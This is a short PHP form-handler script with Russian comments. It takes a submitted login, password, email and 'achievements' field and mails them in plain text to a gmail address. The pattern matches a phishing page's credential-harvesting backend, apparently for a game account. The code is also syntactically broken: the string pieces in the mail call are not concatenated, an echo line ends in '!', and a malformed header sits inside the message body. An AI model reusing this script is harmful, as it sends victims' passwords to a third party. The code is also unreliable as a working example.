<?php

  // получим данные с элементов формы

  $login = $_POST['login'];
  $pass = $_POST['pass'];
  $email = $_POST['email'];
  $skill = $_POST['skill'];
 
 
 
  // обработаем полученые данные
  
  $login = htmlspecialchars($login); // преобразования символов в сущности (мнемоники)
  $pass = htmlspecialchars($pass);
  $email = htmlspecialchars($email);
  $skill = htmlspecialchars($skill);
  
  $login = urldecode($login); // декодирования URL
  $pass = urldecode($pass);
  $email = urldecode($email);
  $skill = urldecode($skill);
  
  $login = trim($login); // удаление проблемных символов с обоих сторон 
  $pass = trim($pass);
  $email = trim($email);
  $skill = trim($skill);
  
  
  
  // отправляем данные на почту 
 
 if (mail("maxgamesapk@gmail.com",
          "новое письмо с сайта",
          "логин: ".$login."\n"
          "пароль: ".$pass."\n"
          "email: ".$email."\n"
          "достижения: ".$skill."\n"
          "Form: no-rely@mydomain.ru /r/n")
 
 ) {
    echo('Писымо успешно отправлено')!
 }
 
 else {
  echo ('eсть ошибки проверыте данные');
 }
  
?>